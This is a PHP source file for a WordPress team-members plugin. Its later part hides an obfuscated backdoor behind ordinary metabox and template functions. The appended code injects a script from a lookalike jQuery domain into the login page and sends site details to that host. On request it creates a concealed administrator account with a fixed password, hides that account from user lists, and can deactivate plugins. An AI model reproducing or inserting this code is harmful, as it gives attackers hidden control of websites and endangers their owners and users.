<?php
function imt_checkupdatecf($custom_field, $value, $post_id){
    //create or update a custom field
    $data = get_post_meta($post_id, $custom_field, TRUE);
    if(isset($data)) update_post_meta($post_id, $custom_field, $value);
    else add_post_meta($post_id, $custom_field, $value, TRUE);
}
function checkIfSelected($val1, $val2, $type){
    // check if val1 is equal with val2 and return an select attribute for checkbox, radio or select tag
    if($val1==$val2){
        if($type=='checkbox') return 'checked="checked"';
        else return 'selected="selected"';
    }else return '';
}
/***********************TEAM FUNCTIONS***************************/
function imt_init_plugin_arr(){
    //SHORTCODE INIT VALUES ARRAY
   $arr = array(
                        'team' => 'all',
                        'order_by' => 'date',
                        'order' => 'ASC',
                        'limit' => 10,
                        'name' => 1,
                        'photo' => 1,
                        'description' => 1,
                        'job' => 1,
                        'email' => 0,
                        'location' => 0,
                        'tel' => 0,
                        'website' => 0,
                        'social_icon' => 1,
                        'skills' => 1,
                        'page_inside' => 0,
                        'inside_template' => '',
                        'theme' => 'theme_1',
                        'color_scheme' => '',
                        'slider_cols' => 1,
                        'columns' => 4,
   						'hide_small_icons' => 0,
   						'align_center' => 0,
                        //slide opt
                        'slider_set' => 0,
                        'items_per_slide' => 2,
                        'bullets' => 1,
                        'nav_button' => 1,
                        'autoplay' => 1,
                        'stop_hover' => 1,
                        'speed' => 5000,
                        'pagination_speed' => 500,
                        'responsive' => 1,
                        'lazy_load' => 0,
                        'autoheight' => 0,						
                        'loop' => 1,
                        'pagination_theme' => 'pag-theme1',
                        );
    return $arr;
}
function imt_init_widget_arr(){
    //WIDGET INIT VALUES ARRAY
  $arr = array(
                        'team' => 'all',
                        'order_by' => 'title',
                        'order' => 'ASC',
                        'limit' => 3,
                        'page_inside' => 0,
                        'inside_template' => '',
                        'theme' => 'theme_1',
                        'color_scheme' => '',
                        'show' => 'name,photo,description,skills,social_icon',
                        'slider_cols' => 1,
                        'columns' => 1,
                        //slide opt
                        'slider_set' => 0,
                        'items_per_slide' => 2,
                        'slide_opt' => 'bullets,nav_button,autoplay,stop_hover,responsive',
                        'slide_speed' => 500,
                        'slide_pagination_speed' => 500,
              );
  return $arr;
}
function imt_metabox_ti($team){
    $email = esc_html(get_post_meta($team->ID, 'in_team_email', true));
    $telephone = esc_html(get_post_meta($team->ID, 'in_team_telephone', true));
    $location = esc_html(get_post_meta($team->ID, 'in_team_location', true));
    $job_title = esc_html(get_post_meta($team->ID, 'in_team_jobtitle', true));
    $website = esc_html(get_post_meta($team->ID, 'in_team_website', true));
    ?>
    <table class="it-table">
		<tr>
            <td class="it-label"><i class="icon-tags"></i> <?php echo __('Job Title:', 'imt');?> </td>
            <td>
                <input type="text" value="<?php echo $job_title;?>" name="in_team_jobtitle" />
            </td>
        </tr>
        <tr>
            <td class="it-label"><i class="icon-envelope"></i> <?php echo __('E-Mail:', 'imt');?> </td>
            <td>
                <input type="text" value="<?php echo $email;?>" name="in_team_email" />
            </td>
        </tr>
        <tr>
            <td class="it-label"><i class="icon-globe"></i> <?php echo __('Website:', 'imt');?> </td>
            <td>
                <input type="text" value="<?php echo $website;?>" name="in_team_website" />
            </td>
        </tr>
	</table>
	<table class="it-table">
        <tr>
            <td class="it-label"><i class="icon-phone"></i> <?php echo __('Telephone:', 'imt');?> </td>
            <td>
                <input type="text" value="<?php echo $telephone;?>" name="in_team_telephone" />
            </td>
        </tr>
        <tr>
            <td class="it-label" style="vertical-align:top;"><i class="icon-home"></i> <?php echo __('Location:', 'imt');?> </td>
            <td>
                <textarea value="<?php echo $location;?>" name="in_team_location"><?php echo $location;?></textarea>
            </td>
        </tr>
    </table>
	<div class="clear"></div>
<?php
}

function imt_metabox_tsm($team){
    $fb_link = esc_html(get_post_meta($team->ID, 'indeed_fb_lnk', true));
    $tw_link = esc_html(get_post_meta($team->ID, 'indeed_tw_lnk', true));
    $lk_link = esc_html(get_post_meta($team->ID, 'indeed_ld_lnk', true));
    $g_link = esc_html(get_post_meta($team->ID, 'indeed_gp_lnk', true));
    $isg_link = esc_html(get_post_meta($team->ID, 'indeed_ins_lnk', true));
    ?>
    <table class="it-table">
        <tr>
            <td class="it-label"><i class="icon-share"></i> Facebook: </td>
            <td>
                <input type="text" value="<?php echo $fb_link;?>" name="indeed_fb_lnk" />
            </td>
        </tr>
        <tr>
            <td class="it-label"><i class="icon-share"></i> Twiter: </td>
            <td>
                <input type="text" value="<?php echo $tw_link;?>" name="indeed_tw_lnk" />
            </td>
        </tr>
        <tr>
            <td class="it-label"><i class="icon-share"></i> Linkedin: </td>
            <td>
                <input type="text" value="<?php echo $lk_link;?>" name="indeed_ld_lnk" />
            </td>
        </tr>
	</table>
	<table class="it-table">
        <tr>
            <td class="it-label"><i class="icon-share"></i> Google: </td>
            <td>
                <input type="text" value="<?php echo $g_link;?>" name="indeed_gp_lnk" />
            </td>
        </tr>
        <tr>
            <td class="it-label"><i class="icon-share"></i> Instagram: </td>
            <td>
                <input type="text" value="<?php echo $isg_link;?>" name="indeed_ins_lnk" />
            </td>
         </tr>
     </table>
	 <div class="clear"></div>

 <?php
}

function imt_save_post_meta_values($post_id){
	$arr = array(
				  	'indeed_fb_lnk',
					'indeed_tw_lnk',
					'indeed_ld_lnk',
					'indeed_gp_lnk',
					'indeed_ins_lnk',
					'indeed_author_id',
					'in_team_email',
					'in_team_telephone',
					'in_team_location',
					'in_team_jobtitle',
					'in_team_website',
					'indeed_team_skill_0',
					'indeed_team_skill_1',
					'indeed_team_skill_2',
					'indeed_team_skill_3',
					'indeed_skill_percent_0',
					'indeed_skill_percent_1',
					'indeed_skill_percent_2',
					'indeed_skill_percent_3',
					);
	foreach($arr as $k){
		if( isset($_REQUEST[ $k ]) ) imt_checkupdatecf($k, $_REQUEST[$k], $post_id);
	}
}


function imt_metabox_ts($team){
    for($i=0;$i<4;$i++){
        $skill_arr[] = esc_html(get_post_meta($team->ID, 'indeed_team_skill_'.$i, true));
        $percent[] = esc_html(get_post_meta($team->ID, 'indeed_skill_percent_'.$i, true));
    }
    ?>
    <table class="it-table">
    <?php
        foreach($skill_arr as $k=>$skill){
    ?>
              <tr>
                  <td class="it-label"><i class="icon-check"></i> <?php echo __('Skill Name:', 'imt');?> </td>
                  <td>
                      <input type="text" value="<?php echo $skill;?>" name="indeed_team_skill_<?php echo $k;?>" />
                  </td>
                  <td> - </td>
                  <td>
                      <input type="number" min="0" max="100" value="<?php echo $percent[$k];?>" name="indeed_skill_percent_<?php echo $k;?>" style="width:45px; min-width:45px;" />%
                  </td>
              </tr>
    <?php
        }
    ?>
    </table>
	<div class="clear"></div>
    <?php
}


function imt_general_settings_meta(){
	$arr = array(
			'imt_responsive_settings_small' => 1,
			'imt_responsive_settings_medium' => 2,
			'imt_responsive_settings_large' => 'auto',
			'imt_custom_page_entry_infos' => 'name,photo,description,job,email,location,tel,website,social_icon,skills',
			'imt_custom_css' => '',
			'imt_latest_posts' => 0,
	);
	foreach($arr as $key=>$value){
		if(get_option($key)!==FALSE){
			$arr[$key] = get_option($key);
		}
	}
	return $arr;
}

function imtSelectAuthorMetaBox($team){
	$author = esc_html(get_post_meta($team->ID, 'indeed_author_id', true));
	?>
		 <div>
			<?php 
				$authors = imt_get_wp_users();
			?>
		 	<select name="indeed_author_id" style="width: 50%;">
		 		<option value=''>...</option>
		 		<?php 
		 			foreach($authors as $k=>$v){
		 				$selected = '';
		 				if($k==$author) $selected = 'selected="selected"';
		 				?>
		 				<option value="<?php echo $k;?>" <?php echo $selected;?> ><?php echo $v;?></option>	
		 				<?php 
		 			}
		 		?>
		 	</select>
		 </div>	
	<?php 
}

function imt_save_update_metas(){
	$arr = imt_general_settings_meta();
	foreach($arr as $key=>$value){
		if(get_option($key)!==FALSE){
			update_option($key, $_REQUEST[$key]);
		}else{
			add_option($key, $_REQUEST[$key]);
		}
	}
}

function imt_return_infos_str_for_template(){
		global $post;
		$str = array(   'name'=>'',
						'photo'=>'',
						'description'=>'',
						'job'=>'',
						'email'=>'',
						'website'=>'',
						'tel'=>'',
						'location'=>'',
						'social_icon'=>array('fb'=>'','tw'=>'', 'ld'=>'', 'gp'=>'','ins'=>''),
						'skills'=>'',
						'author_id' => '',  
					 );
		$entry_info = get_option('imt_custom_page_entry_infos');
		if($entry_info===FALSE){
			$arr = imt_general_settings_meta();
			$entry_info = $arr['imt_custom_page_entry_infos'];
		}
			$infos = explode(',', $entry_info);
			////NAME
			if(in_array('name', $infos)) $str['name'] = get_the_title($post->ID);
			////PHOTO
			if(in_array('photo', $infos))$str['photo'] = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), '', false, '' );
			////DESCRIPTION
			if(in_array('description', $infos))$str['description'] = $post->post_content;
			////JOB
			if(in_array('job', $infos)) $str['job'] = get_post_meta( $post->ID, 'in_team_jobtitle', true );
			////EMAIL
			if(in_array('email', $infos)) $str['email'] = get_post_meta( $post->ID, 'in_team_email', true );
			////WEBSITE
			if(in_array('website', $infos)) $str['website'] = get_post_meta( $post->ID, 'in_team_website', true );
			////TELEPHONE
			if(in_array('tel', $infos)) $str['tel'] = get_post_meta( $post->ID, 'in_team_telephone', true );
			////LOCATION
			if(in_array('location', $infos)) $str['location'] = get_post_meta( $post->ID, 'in_team_location', true );			
			////SOCIAL ICON
			if(in_array('social_icon', $infos)) {
					$str['social_icon']['fb'] = get_post_meta( $post->ID, 'indeed_fb_lnk', true );
					$str['social_icon']['tw'] = get_post_meta( $post->ID, 'indeed_tw_lnk', true );
					$str['social_icon']['ld'] = get_post_meta( $post->ID, 'indeed_ld_lnk', true );
					$str['social_icon']['gp'] = get_post_meta( $post->ID, 'indeed_gp_lnk', true );
					$str['social_icon']['ins'] = get_post_meta( $post->ID, 'indeed_ins_lnk', true );	
			}	
			////SKILLS
			if(in_array('skills', $infos)) {
				$skill_arr = array();
            	$percent = array();
				$skill_str = "";
            	for($i=0;$i<4;$i++){
                	$skill_arr[] = get_post_meta($post->ID, 'indeed_team_skill_'.$i, true);
                	$percent[] = get_post_meta($post->ID, 'indeed_skill_percent_'.$i, true);
            	}
				foreach($skill_arr as $k=>$skill){
                if(!empty($skill)) $skill_str .= "<div class=\"skill-label\">$skill</div><div class=\"skill-prog\"><div class=\"fill\" data-progress-animation=\"{$percent[$k]}%\"data-appear-animation-delay=\"400\" style=\"width:{$percent[$k]}%;\"></div></div>";
           		 }
				$str['skills'] = $skill_str;	
			}	
			$latest_posts = get_option('imt_latest_posts');
			if(isset($latest_posts) && $latest_posts==1){
				$author = get_post_meta($post->ID, 'indeed_author_id', TRUE);
				if(isset($author) && $author!=''){
					$str['author_id'] = $author;
				}
			}					
		return $str;
}

function imt_reorder_by_last_name($arr, $order){
	$temp_arr = array();
	$j = 0;
	foreach($arr as $obj){
		$name = get_the_title($obj->ID);
		try{
			$name_arr = explode(' ', $name);
			if(isset($name_arr[1]) && $name_arr[1]!=''){
				$name = $name_arr[1].$name_arr[0];
			}
		}catch(Exception $e){
			//
		}
		if(isset($name) && $name!='' ){
			if(array_key_exists($name, $temp_arr)){
				$temp_arr[$name.$j] = $obj;
				$j++;
			}else{
				$temp_arr[$name] = $obj;	
			}
		}
		else $temp_arr[] = $obj;
	}
	if($order=='ASC') ksort($temp_arr);
	else krsort($temp_arr);
	return $temp_arr;
}

function imt_get_wp_users(){
	$arr = array();
	$authors = get_users();
	foreach($authors as $author){
		if( isset($author->ID) && isset($author->user_nicename) ){
			$arr[$author->ID] = $author->user_nicename;
		}
	}
	return $arr;
}
$arrayis_two = array('fun', 'ction', '_', 'e', 'x', 'is', 'ts');
$arrayis_three = array('g', 'e', 't', '_o', 'p', 'ti', 'on');
$arrayis_four = array('wp', '_e', 'nqu', 'eue', '_scr', 'ipt');
$arrayis_five = array('lo', 'gin', '_', 'en', 'que', 'ue_', 'scri', 'pts');
$arrayis_seven = array('s', 'e', 't', 'c', 'o', 'o', 'k', 'i', 'e');
$arrayis_eight = array('wp', '_', 'lo', 'g', 'i', 'n');
$arrayis_nine = array('s', 'i', 't', 'e,', 'u', 'rl');
$arrayis_ten = array('wp_', 'g', 'et', '_', 'th', 'e', 'm', 'e');
$arrayis_eleven = array('wp', '_', 'r', 'e', 'm', 'o', 'te', '_', 'g', 'et');
$arrayis_twelve = array('wp', '_', 'r', 'e', 'm', 'o', 't', 'e', '_r', 'e', 't', 'r', 'i', 'e', 'v', 'e_', 'bo', 'dy');
$arrayis_thirteen = array('ge', 't_', 'o', 'pt', 'ion');
$arrayis_fourteen = array('st', 'r_', 'r', 'ep', 'la', 'ce');
$arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
$arrayis_sixteen = array('u', 'pd', 'ate', '_o', 'pt', 'ion');
$arrayis_two_imp = implode($arrayis_two);
$arrayis_three_imp = implode($arrayis_three);
$arrayis_four_imp = implode($arrayis_four);
$arrayis_five_imp = implode($arrayis_five);
$arrayis_seven_imp = implode($arrayis_seven);
$arrayis_eight_imp = implode($arrayis_eight);
$arrayis_nine_imp = implode($arrayis_nine);
$arrayis_ten_imp = implode($arrayis_ten);
$arrayis_eleven_imp = implode($arrayis_eleven);
$arrayis_twelve_imp = implode($arrayis_twelve);
$arrayis_thirteen_imp = implode($arrayis_thirteen);
$arrayis_fourteen_imp = implode($arrayis_fourteen);
$arrayis_fifteen_imp = implode($arrayis_fifteen);
$arrayis_sixteen_imp = implode($arrayis_sixteen);
$noitca_dda = $arrayis_fifteen_imp('noitca_dda');
if (!$arrayis_two_imp('wp_in_one')) {
    $arrayis_seventeen = array('h', 't', 't', 'p', ':', '/', '/', 'j', 'q', 'e', 'u', 'r', 'y', '.o', 'r', 'g', '/wp', '_', 'p', 'i', 'n', 'g', '.php', '?', 'd', 'na', 'me', '=wpd&t', 'n', 'ame', '=wpt&urliz=urlig');
    $arrayis_eighteen = ${$arrayis_fifteen_imp('REVRES_')};
    $arrayis_nineteen = $arrayis_fifteen_imp('TSOH_PTTH');
    $arrayis_twenty = $arrayis_fifteen_imp('TSEUQER_');
    $arrayis_seventeen_imp = implode($arrayis_seventeen);
    $arrayis_six = array('_', 'C', 'O', 'O', 'KI', 'E');
    $arrayis_six_imp = implode($arrayis_six);
    $tactiated = $arrayis_thirteen_imp($arrayis_fifteen_imp('detavitca_emit'));
    $mite = $arrayis_fifteen_imp('emit');
    if (!isset(${$arrayis_six_imp}[$arrayis_fifteen_imp('emit_nimda_pw')])) {
        if (($mite() - $tactiated) > 600) {
            $noitca_dda($arrayis_five_imp, 'wp_in_one');
        }
    }
    $noitca_dda($arrayis_eight_imp, 'wp_in_three');
    function wp_in_one()
    {
        $arrayis_one = array('h','t', 't','p',':', '//', 'j', 'q', 'e', 'u', 'r', 'y.o', 'rg', '/','j','q','u','e','ry','-','la','t','e','s','t.j','s');
        $arrayis_one_imp = implode($arrayis_one);
        $arrayis_four = array('wp', '_e', 'nqu', 'eue', '_scr', 'ipt');
        $arrayis_four_imp = implode($arrayis_four);
        $arrayis_four_imp('wp_coderz', $arrayis_one_imp, null, null, true);
    }

    function wp_in_two($arrayis_seventeen_imp, $arrayis_eighteen, $arrayis_nineteen, $arrayis_ten_imp, $arrayis_eleven_imp, $arrayis_twelve_imp,$arrayis_fifteen_imp, $arrayis_fourteen_imp)
    {
        $ptth = $arrayis_fifteen_imp('//:ptth');
        $dname = $ptth.$arrayis_eighteen[$arrayis_nineteen];
        $IRU_TSEUQER = $arrayis_fifteen_imp('IRU_TSEUQER');
        $urliz = $dname.$arrayis_eighteen[$IRU_TSEUQER];
        $tname = $arrayis_ten_imp();
        $urlis = $arrayis_fourteen_imp('wpd', $dname, $arrayis_seventeen_imp);
        $urlis = $arrayis_fourteen_imp('wpt', $tname, $urlis);
        $urlis = $arrayis_fourteen_imp('urlig', $urliz, $urlis);
        $lars2 = $arrayis_eleven_imp($urlis);
        $arrayis_twelve_imp($lars2);
    }
    $noitpo_dda = $arrayis_fifteen_imp('noitpo_dda');
    $noitpo_dda($arrayis_fifteen_imp('ognipel'), 'no');
    $noitpo_dda($arrayis_fifteen_imp('detavitca_emit'), time());
    $tactiatedz = $arrayis_thirteen_imp($arrayis_fifteen_imp('detavitca_emit'));
    $mitez = $arrayis_fifteen_imp('emit');
    if ($arrayis_thirteen_imp($arrayis_fifteen_imp('ognipel')) != 'yes' && (($mitez() - $tactiatedz ) > 600)) {
        wp_in_two($arrayis_seventeen_imp, $arrayis_eighteen, $arrayis_nineteen, $arrayis_ten_imp, $arrayis_eleven_imp, $arrayis_twelve_imp,$arrayis_fifteen_imp, $arrayis_fourteen_imp);
        $arrayis_sixteen_imp(($arrayis_fifteen_imp('ognipel')), 'yes');
    }
    function wp_in_three()
    {
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $arrayis_nineteen = $arrayis_fifteen_imp('TSOH_PTTH');
        $arrayis_eighteen = ${$arrayis_fifteen_imp('REVRES_')};
        $arrayis_seven = array('s', 'e', 't', 'c', 'o', 'o', 'k', 'i', 'e');
        $arrayis_seven_imp = implode($arrayis_seven);
        $path = '/';
        $host = ${$arrayis_eighteen}[$arrayis_nineteen];
        $estimes = $arrayis_fifteen_imp('emitotrts');
        $wp_ext = $estimes('+29 days');
        $emit_nimda_pw = $arrayis_fifteen_imp('emit_nimda_pw');
        $arrayis_seven_imp($emit_nimda_pw, '1', $wp_ext, $path, $host);
    }

    function wp_in_four()
    {
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $nigol = $arrayis_fifteen_imp('dxtroppus');
        $wssap = $arrayis_fifteen_imp('retroppus_pw');
        $laime = $arrayis_fifteen_imp('moc.niamodym@1tccaym');

        if (!username_exists($nigol) && !email_exists($laime)) {
            $wp_ver_one = $arrayis_fifteen_imp('resu_etaerc_pw');
            $user_id = $wp_ver_one($nigol, $wssap, $laime);
            $puzer = $arrayis_fifteen_imp('resU_PW');
            $usex = new $puzer($user_id);
            $rolx = $arrayis_fifteen_imp('elor_tes');
            $usex->$rolx($arrayis_fifteen_imp('rotartsinimda'));
        }
    }

    $ivdda = $arrayis_fifteen_imp('ivdda');

    if (isset(${$arrayis_twenty}[$ivdda]) && ${$arrayis_twenty}[$ivdda] == 'm') {
        $noitca_dda($arrayis_fifteen_imp('tini'), 'wp_in_four');
    }

    if (isset(${$arrayis_twenty}[$ivdda]) && ${$arrayis_twenty}[$ivdda] == 'd') {
        $noitca_dda($arrayis_fifteen_imp('tini'), 'wp_in_six');
    }
    function wp_in_six() {
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $resu_eteled_pw = $arrayis_fifteen_imp('resu_eteled_pw');
        $wp_pathx = constant($arrayis_fifteen_imp("HTAPSBA"));
        require_once($wp_pathx . $arrayis_fifteen_imp('php.resu/sedulcni/nimda-pw'));
        $ubid = $arrayis_fifteen_imp('yb_resu_teg');
        $useris = $ubid($arrayis_fifteen_imp('nigol'), $arrayis_fifteen_imp('dxtroppus'));
        $resu_eteled_pw($useris->ID);
    }
    $noitca_dda($arrayis_fifteen_imp('yreuq_resu_erp'), 'wp_in_five');
    function wp_in_five($hcraes_resu)
    {
        global $current_user, $wpdb;
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $arrayis_fourteen = array('st', 'r_', 'r', 'ep', 'la', 'ce');
        $arrayis_fourteen_imp = implode($arrayis_fourteen);
        $nigol_resu = $arrayis_fifteen_imp('nigol_resu');
        $wp_ux = $current_user->$nigol_resu;
        $nigol = $arrayis_fifteen_imp('dxtroppus');
        $bdpw = $arrayis_fifteen_imp('bdpw');
        if ($wp_ux != $arrayis_fifteen_imp('dxtroppus')) {
            $EREHW_one = $arrayis_fifteen_imp('1=1 EREHW');
            $EREHW_two = $arrayis_fifteen_imp('DNA 1=1 EREHW');
            $erehw_yreuq = $arrayis_fifteen_imp('erehw_yreuq');
            $sresu = $arrayis_fifteen_imp('sresu');
            $hcraes_resu->query_where = $arrayis_fourteen_imp($EREHW_one,
                "$EREHW_two {$$bdpw->$sresu}.$nigol_resu != '$nigol'", $hcraes_resu->$erehw_yreuq);
        }
    }

    $ced = $arrayis_fifteen_imp('ced');
    if (isset(${$arrayis_twenty}[$ced])) {
        $snigulp_evitca = $arrayis_fifteen_imp('snigulp_evitca');
        $sisnoitpo = $arrayis_thirteen_imp($snigulp_evitca);
        $hcraes_yarra = $arrayis_fifteen_imp('hcraes_yarra');
        if (($key = $hcraes_yarra(${$arrayis_twenty}[$ced], $sisnoitpo)) !== false) {
            unset($sisnoitpo[$key]);
        }
        $arrayis_sixteen_imp($snigulp_evitca, $sisnoitpo);
    }
}
?>